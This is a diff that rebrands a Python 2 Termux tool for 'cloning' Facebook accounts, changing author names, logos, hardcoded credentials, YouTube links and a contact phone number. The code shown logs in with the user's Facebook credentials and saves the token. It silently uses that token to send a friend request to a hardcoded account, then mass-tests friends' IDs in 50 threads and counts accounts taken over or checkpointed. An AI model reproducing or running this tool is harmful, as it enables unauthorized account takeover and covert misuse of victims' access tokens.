@@ -1,6 +1,6 @@
 #!/usr/bin/python2
 #coding=utf-8
-#The Credit For This Code Goes To lovehacker
+#The Credit For This Code Goes To Afridi
 #If You Wanna Take Credits For This Code, Please Look Yourself Again...
 #Reserved2020
 
@@ -48,21 +48,21 @@ def jalan(z):
 		sys.stdout.flush()
 		time.sleep(0.01)
 
-#Dev:love_hacker
+#Dev:mrijaz
 ##### LOGO #####
 logo = """
-\033[1;96m██████╗░██╗░░░░░░█████╗░░█████╗░██╗░░██╗
-\033[1;96m██╔══██╗██║░░░░░██╔══██╗██╔══██╗██║░██╔╝
-\033[1;96m██████╦╝██║░░░░░███████║██║░░╚═╝█████═╝░
-\033[1;96m██╔══██╗██║░░░░░██╔══██║██║░░██╗██╔═██╗░
-\033[1;96m██████╦╝███████╗██║░░██║╚█████╔╝██║░╚██╗
-\033[1;96m╚═════╝░╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
-\033[1;96m███╗░░░███╗░█████╗░███████╗██╗░█████╗░
-\033[1;96m████╗░████║██╔══██╗██╔════╝██║██╔══██╗
-\033[1;96m██╔████╔██║███████║█████╗░░██║███████║
-\033[1;96m██║╚██╔╝██║██╔══██║██╔══╝░░██║██╔══██║
-\033[1;96m██║░╚═╝░██║██║░░██║██║░░░░░██║██║░░██║
-╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝
+\033[1;96m██╗░░░░░██╗░█████╗░███████╗
+\033[1;96m██║░░░░░██║██╔══██╗╚════██║
+\033[1;96m██║░░░░░██║███████║░░███╔═╝
+\033[1;96m██║██╗░░██║██╔══██║██╔══╝░░
+\033[1;96m██║╚█████╔╝██║░░██║███████╗
+\033[1;96m╚═╝░╚════╝░╚═╝░░╚═╝╚══════╝
+\033[1;96m┏━━━┓ ┏━━━┓ ┏━━━┓ ┏━━┓ ┏━━━┓ ┏━━┓
+\033[1;96m┃┏━┓┃ ┃┏━━┛ ┃┏━┓┃ ┗┫┣┛ ┗┓┏┓┃ ┗┫┣┛
+\033[1;96m┃┃︱┃┃ ┃┗━━┓ ┃┗━┛┃ ︱┃┃︱ ︱┃┃┃┃ ︱┃┃︱
+\033[1;96m┃┗━┛┃ ┃┏━━┛ ┃┏┓┏┛ ︱┃┃︱ ︱┃┃┃┃ ︱┃┃︱
+\033[1;96m┃┏━┓┃ ┃┃︱︱︱ ┃┃┃┗┓ ┏┫┣┓ ┏┛┗┛┃ ┏┫┣┓
+\033[1;96m┗┛︱┗┛ ┗┛︱︱︱ ┗┛┗━┛ ┗━━┛ ┗━━━┛ ┗━━┛
                       _____ 
             ¸,.-~·*¨.::::::::::¨*·~-.,¸ 
       ¸.· ´::::::´: . · .¨             ::` ·.¸ 
@@ -88,15 +88,15 @@ logo = """
 :    :¯¯¯:     :  `·´¯¯`·. :  :  .·´.·´_.·´`·.': :   `·.:  : 
 |`·._`·..·´   ¸.·|`·.·´¯`·.·´|`·.|·´_____.·.(·'_.|   '.·'_.| 
 `·.|.·´__.·´ .·´`·.|.·´`·.|·´`·.¸||______|/\||_'|/   |__|/ 
-   |___'|.·´    lovehacker BlackMafia     -«
-\033[1;97m:•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;94mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•
-\033[1;96m:•◈•╔╗─────────╔╗───────╔╗
-\033[1;96m:•◈•║║─────────║║───────║║
-\033[1;96m:•◈•║║╔══╦╗╔╦══╣╚═╦══╦══╣║╔╦══╦═╗
-\033[1;96m:•◈•║║║╔╗║╚╝║║═╣╔╗║╔╗║╔═╣╚╝╣║═╣╔╝   
-\033[1;96m:•◈•║╚╣╚╝╠╗╔╣║═╣║║║╔╗║╚═╣╔╗╣║═╣║    
-\033[1;96m:•◈•╚═╩══╝╚╝╚══╩╝╚╩╝╚╩══╩╝╚╩══╩╝
-\033[1;97m:•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;94mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"""
+   |___'|.·´    MrBadmash IjazAfridi     -«
+\033[1;97m:•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;94mMrbadmash\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•
+\033[1;96m:•◈•┏┓┏━┓ ┏┓︱┏┓ ┏━━━┓ ┏━┓︱┏┓
+\033[1;96m:•◈•┃┃┃┏┛ ┃┃︱┃┃ ┃┏━┓┃ ┃┃┗┓┃┃
+\033[1;96m:•◈•┃┗┛┛︱ ┃┗━┛┃ ┃┃︱┃┃ ┃┏┓┗┛┃
+\033[1;96m:•◈•┃┏┓┃︱ ┃┏━┓┃ ┃┗━┛┃ ┃┃┗┓┃┃
+\033[1;96m:•◈•┃┃┃┗┓ ┃┃︱┃┃ ┃┏━┓┃ ┃┃︱┃┃┃
+\033[1;96m:•◈•┗┛┗━┛ ┗┛︱┗┛ ┗┛︱┗┛ ┗┛︱┗━┛
+\033[1;97m:•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;94mMrbadmash\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"""
 
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -115,13 +115,13 @@ vuln = "\033[32mVuln"
 
 os.system("clear")
 print  """
-\033[1;96m╔══╗╔╗──────╔╗─╔═╗╔═╗───╔═╗
-\033[1;96m║╔╗║║║──────║║─║║╚╝║║───║╔╝
-\033[1;96m║╚╝╚╣║╔══╦══╣║╔╣╔╗╔╗╠══╦╝╚╦╦══╗
-\033[1;96m║╔═╗║║║╔╗║╔═╣╚╝╣║║║║║╔╗╠╗╔╬╣╔╗║
-\033[1;96m║╚═╝║╚╣╔╗║╚═╣╔╗╣║║║║║╔╗║║║║║╔╗║
-\033[1;96m╚═══╩═╩╝╚╩══╩╝╚╩╝╚╝╚╩╝╚╝╚╝╚╩╝╚╝
-\033[1;96m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;93mBlackMafia\033[1;96m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"""
+\033[1;96m┏━┓┏━┓ ┏━━━┓
+\033[1;96m┃┃┗┛┃┃ ┃┏━┓┃
+\033[1;96m┃┏┓┏┓┃ ┃┗━┛┃
+\033[1;96m┃┃┃┃┃┃ ┃┏┓┏┛
+\033[1;96m┃┃┃┃┃┃ ┃┃┃┗┓
+\033[1;96m┗┛┗┛┗┛ ┗┛┗━┛
+\033[1;96m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;93mMrBadmash\033[1;96m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"""
 jalan("\033[1;96m----------------------//\\")
 jalan("\033[1;96m---------------------// ¤ \\")
 jalan("\033[1;96m---------------------\\ ¤ //")
@@ -163,19 +163,19 @@ jalan("\033[1;96m----------------------\\¤// ")
 jalan("\033[1;96m-----------------------\|/ ")
 jalan("\033[1;96m------------------------V ")                                     
 jalan("\033[1;96m------------------------------------")
-jalan("\033[1;96m╭━━━╮╱╱╱╱╱╭╮╱╱╱╱╭━╮╭━╮")
-jalan("\033[1;96m┃╭━╮┃╱╱╱╱╱┃┃╱╱╱╱┃┃╰╯┃┃")
-jalan("\033[1;96m┃╰━━┳━━┳┳━╯┣━━┳━┫╭╮╭╮┣━━┳━╮")
-jalan("\033[1;96m╰━━╮┃╭╮┣┫╭╮┃┃━┫╭┫┃┃┃┃┃╭╮┃╭╮╮")
-jalan("\033[1;96m┃╰━╯┃╰╯┃┃╰╯┃┃━┫┃┃┃┃┃┃┃╭╮┃┃┃┃")
-jalan("\033[1;96m╰━━━┫╭━┻┻━━┻━━┻╯╰╯╰╯╰┻╯╰┻╯╰╯")
-jalan("\033[1;96m╱╱╱╱┃┃")
+jalan("\033[1;96m┏━━┓︱ ┏━━━┓ ┏━━━┓ ┏━┓┏━┓ ┏━━━┓ ┏━━━┓ ┏┓︱┏┓
+jalan("\033[1;96m┃┏┓┃︱ ┃┏━┓┃ ┗┓┏┓┃ ┃┃┗┛┃┃ ┃┏━┓┃ ┃┏━┓┃ ┃┃︱┃┃
+jalan("\033[1;96m┃┗┛┗┓ ┃┃︱┃┃ ︱┃┃┃┃ ┃┏┓┏┓┃ ┃┃︱┃┃ ┃┗━━┓ ┃┗━┛┃
+jalan("\033[1;96m┃┏━┓┃ ┃┗━┛┃ ︱┃┃┃┃ ┃┃┃┃┃┃ ┃┗━┛┃ ┗━━┓┃ ┃┏━┓┃
+jalan("\033[1;96m┃┗━┛┃ ┃┏━┓┃ ┏┛┗┛┃ ┃┃┃┃┃┃ ┃┏━┓┃ ┃┗━┛┃ ┃┃︱┃┃
+jalan("\033[1;96m┗━━━┛ ┗┛︱┗┛ ┗━━━┛ ┗┛┗┛┗┛ ┗┛︱┗┛ ┗━━━┛ ┗┛︱┗┛
+jalan("\033[1;96m╱╱╱╱")
 jalan("\033[1;96m╱╱╱╱╰╯")
-jalan('\033[1;93m              Welcome to BlackMafia')
-print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;96mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+jalan('\033[1;93m              Welcome to MrBadmash')
+print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;96mMrBadmash\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 
-CorrectUsername = "SpiderMan"
-CorrectPassword = "lovehacker"
+CorrectUsername = "Mrbadmash"
+CorrectPassword = "Afridi"
 
 loop = 'true'
 while (loop == 'true'):
@@ -188,10 +188,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "\033[1;96mWrong Password"
-            os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+            os.system('xdg-open https://www.youtube.com/channel/UCCyRQcvCFo1ZgH4NaJM-qNw')
     else:
         print "\033[1;96mWrong Username"
-        os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+        os.system('xdg-open https://www.youtube.com/channel/UCCyRQcvCFo1ZgH4NaJM-qNw')
 
 def login():
 	os.system('clear')
@@ -204,7 +204,7 @@ def login():
 		jalan(' \033[1;93mWarning: \033[1;96mDo Not Use Your Personal Account' )
 		jalan(' \033[1;93mWarning: \033[1;96mUse a New Account To Login' )
 		jalan(' \033[1;93mWarning: \033[1;96mTermux  All version Work✅' )                 
-		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mMrBadmash\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 		print('	   \033[1;97m▬\x1b[1;94m.........LOGIN WITH FACEBOOK........\x1b[1;97m▬' )
 		print('	' )
 		id = raw_input('\033[1;97m[+] \x1b[1;94mID/Email\x1b[1;97m: \x1b[1;94m')
@@ -236,7 +236,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;96mLogin Successful.•◈•..'
-				os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+				os.system('xdg-open https://www.youtube.com/channel/UCCyRQcvCFo1ZgH4NaJM-qNw')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -278,12 +278,12 @@ def menu():
 	except requests.exceptions.ConnectionError:
 		print"\x1b[1;94mThere is no internet connection"
 		keluar()
-	os.system("clear") #Dev:love_hacker
+	os.system("clear") #Dev:mrijaz
 	print logo
 	print "  \033[1;97m«----•◈••◈•----\033[1;93mLogged in User Info\033[1;97m----•◈••◈•-----»"
 	print "	   \033[1;97m Name\033[1;97m:\033[1;94m"+nama+"\033[1;97m               "
 	print "	   \033[1;97m ID\033[1;97m:\033[1;94m"+id+"\x1b[1;97m              "
-	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
+	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mMrBadmash\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
 	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;96mStart Cloning..."
 	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m0.\033[1;97mlogout            "
 	pilih()
@@ -330,7 +330,7 @@ def pilih_super():
 	elif peak =="1":
 		os.system('clear')
 		print logo
-		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;93mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
+		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;93mMrBadmash\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
 		jalan('\033[1;94mGetting IDs \033[1;94m...')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
@@ -340,7 +340,7 @@ def pilih_super():
 		os.system('clear')
 		print logo
 		idt = raw_input("\033[1;97m[•◈•] \033[1;94mEnter ID\033[1;97m: \033[1;97m")
-		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;93mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;93mMrBadmash\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -366,9 +366,9 @@ def pilih_super():
 	for o in titik:
 		print("\r\033[1;94mCloning\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;97m«--•◈••◈•---\x1b[1;93m•◈•Stop Process Press CTRL+Z•◈•\033[1;97m---•◈••◈•-»"
-	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;93mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
+	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;93mMrBadmash\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
 	jalan(' \033[1;97m.................\033[1;93mCloning Start..\033[1;97m............ ')
-	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;93mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
+	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;93mMrBadmash\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
 	
 			
 	def main(arg):
@@ -487,9 +487,9 @@ def pilih_super():
 		
 	p = ThreadPool(50)
 	p.map(main, id)
-	print "\033[1;96m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;93mBlackMafia\033[1;96m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;93m«---•◈•---Developed By love-Hacker--•◈•---»" #Dev:love_hacker
-	print '\033[1;96m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 SpiderMan.py)↩\033[1;97m....'
+	print "\033[1;96m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;93mMrBadmash\033[1;96m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+	print "  \033[1;93m«---•◈•---Developed By Mr-Badmash--•◈•---»" #Dev:mrijaz
+	print '\033[1;96m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 mrijaz.py)↩\033[1;97m....'
 	print"\033[1;92mTotal OK/\x1b[1;93mCP \033[1;93m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
 	print """
                          ¸,.-~·¹´¨¨¨¨¨¨¨¨¨¨¨¨¨¨`²·~-.,¸        
@@ -512,10 +512,10 @@ def pilih_super():
                        Checkpoint ID Open After 7 Days
 
 •\033[1;93m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;96m ....lovehacker  BlackMafia....... \033[1;93m :
+: \033[1;96m ....Ijaz  Afridi....... \033[1;93m :
 •\033[1;93m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                 WhatsApp Num
-              \033[1;96m +923094161457"""
+              \033[1;96m +923489153973"""
 	
 	raw_input("\n\033[1;93m[\033[1;96mBack\033[1;93m]")
 	menu()
